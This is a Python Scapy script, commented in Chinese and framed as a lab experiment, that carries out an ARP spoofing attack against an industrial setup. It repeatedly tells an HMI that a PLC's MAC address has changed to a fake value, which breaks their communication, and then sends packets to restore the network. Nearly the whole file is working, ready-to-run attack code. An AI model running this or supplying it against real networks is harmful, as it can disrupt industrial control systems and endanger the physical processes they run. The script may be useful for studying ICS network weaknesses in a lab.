from scapy.all import *
import time
import sys
import threading  # 导入线程模块
from scapy.layers.l2 import ARP


def get_mac(ip):
    """获取指定IP的MAC地址"""
    print(f"正在获取 {ip} 的MAC地址...")
    # 使用 sr1 发送 ARP 请求并等待响应
    response = sr1(ARP(pdst=ip), timeout=3, verbose=False)
    if response:
        return response.hwsrc
    else:
        print(f"无法获取 {ip} 的MAC地址")
        return None


# --- 新增的攻击执行函数 ---
def perform_attack(plc_ip, hmi_ip, hmi_mac, stop_event):
    """在一个独立的线程中执行持续的ARP欺骗攻击"""

    fake_mac = "ee:ee:ee:ee:ee:ee"
    count = 0
    print("\n=== 开始ARP欺骗攻击 (在后台线程中运行) ===")
    print("攻击原理: 告诉HMI，PLC的MAC地址改变了")
    print("等待用户按下 Enter 或 Ctrl+C 停止攻击\n")

    while not stop_event.is_set():
        # 构造并发送ARP欺骗包
        atk_packet = ARP(
            op=2,
            psrc=plc_ip,
            hwsrc=fake_mac,  # 欺骗的MAC地址
            pdst=hmi_ip,
            hwdst=hmi_mac
        )
        send(atk_packet, verbose=False)
        count += 1

        # 优化显示，不需要 sys.stdout.flush()
        print(f"\r已发送欺骗包: {count}", end="")

        # 使用 wait() 代替 sleep()，这样如果事件被设置，它会立即返回
        stop_event.wait(2)  # 每 2 秒检查一次停止信号


def arp_attack():
    """执行ARP欺骗攻击的主函数"""
    # 实验环境IP
    plc_ip = "192.168.1.3"
    hmi_ip = "192.168.1.4"

    # 停止信号量
    stop_event = threading.Event()

    print("=== ARP欺骗攻击实验 ===\n")

    # 获取MAC地址
    plc_mac = get_mac(plc_ip)
    hmi_mac = get_mac(hmi_ip)

    if not plc_mac or not hmi_mac:
        print("获取MAC地址失败，请检查网络连接!")
        return

    print(f"\n获取成功:")
    print(f"PLC: {plc_ip} -> {plc_mac}")
    print(f"HMI: {hmi_ip} -> {hmi_mac}")

    # 启动攻击线程
    attack_thread = threading.Thread(
        target=perform_attack,
        args=(plc_ip, hmi_ip, hmi_mac, stop_event)
    )
    attack_thread.daemon = True  # 设置为守护线程，确保主程序退出时它也会退出
    attack_thread.start()

    # 主线程负责等待用户输入来停止攻击
    try:
        input("\n\n按 Enter 停止攻击...")
        print("\n\n用户停止攻击...")
    except KeyboardInterrupt:
        print("\n\nCtrl+C 停止攻击...")

    # 发出停止信号并等待攻击线程结束
    stop_event.set()
    attack_thread.join(timeout=3)  # 最多等待 3 秒，防止卡死

    # --- 网络恢复阶段 ---
    print("\n=== 恢复网络 ===")

    for i in range(1, 11):  # 循环 10 次
        resume_packet = ARP(
            op=2,
            psrc=plc_ip,
            hwsrc=plc_mac,  # 真实的MAC地址
            pdst=hmi_ip,
            hwdst=hmi_mac
        )
        send(resume_packet, verbose=False)
        print(f"发送恢复包 {i}/10")
        time.sleep(0.5)

    print("✓ 网络恢复完成!")


if __name__ == "__main__":
    arp_attack()
